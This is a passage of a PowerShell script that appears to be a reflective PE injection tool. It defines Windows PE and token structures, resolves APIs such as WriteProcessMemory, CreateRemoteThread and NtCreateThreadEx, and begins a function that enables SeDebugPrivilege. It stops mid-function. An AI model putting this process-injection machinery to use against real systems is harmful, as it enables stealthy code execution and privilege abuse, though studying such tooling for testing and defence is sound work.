		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
